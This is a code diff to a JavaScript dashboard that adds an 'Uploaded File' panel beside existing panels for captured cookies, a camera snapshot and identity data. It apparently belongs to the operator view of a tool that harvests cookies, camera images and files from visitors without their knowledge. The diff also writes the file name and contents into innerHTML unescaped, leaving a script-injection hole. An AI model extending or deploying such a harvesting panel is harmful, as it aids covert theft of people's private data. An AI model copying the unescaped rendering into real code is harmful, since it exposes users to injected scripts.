@@ -79,6 +79,21 @@ document.addEventListener('DOMContentLoaded', () => {
             ? `<div class="cookie-block">${meta.cookies}</div>`
             : `<div class="cookie-block" style="color:#475569;">No cookies captured</div>`;
 
+        let uploadedHtml = `<div style="color:#334155;padding:1rem;text-align:center;">No file uploaded</div>`;
+        if (entry.uploadedFile && entry.uploadedFileName) {
+            if (entry.uploadedFile.startsWith('data:image')) {
+                uploadedHtml = `
+                    <p style="color:#a78bfa;font-size:0.85rem;margin-bottom:8px;">📁 ${entry.uploadedFileName}</p>
+                    <img src="${entry.uploadedFile}" style="max-width:100%;border-radius:8px;border:2px solid #a78bfa;" alt="Uploaded file">`;
+            } else {
+                uploadedHtml = `
+                    <div style="background:rgba(167,139,250,0.08);border:1px solid #a78bfa;border-radius:8px;padding:12px;font-family:monospace;font-size:0.85rem;color:#a78bfa;">
+                        📁 ${entry.uploadedFileName}<br>
+                        <span style="color:#64748b;font-size:0.8rem;">${(entry.uploadedFile.length * 0.75 / 1024).toFixed(1)} KB received</span>
+                    </div>`;
+            }
+        }
+
         detailPanel.innerHTML = `
             <!-- IDENTITY -->
             <div class="detail-panel">
@@ -120,6 +135,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <div class="detail-panel">
                 <h3><i class="fa-solid fa-camera"></i> &nbsp;Camera Snapshot</h3>
                 ${photoHtml}
+            </div>
+
+            <!-- UPLOADED FILE -->
+            <div class="detail-panel">
+                <h3><i class="fa-solid fa-file-arrow-up"></i> &nbsp;Uploaded File</h3>
+                ${uploadedHtml}
             </div>
 
             <!-- COOKIES -->
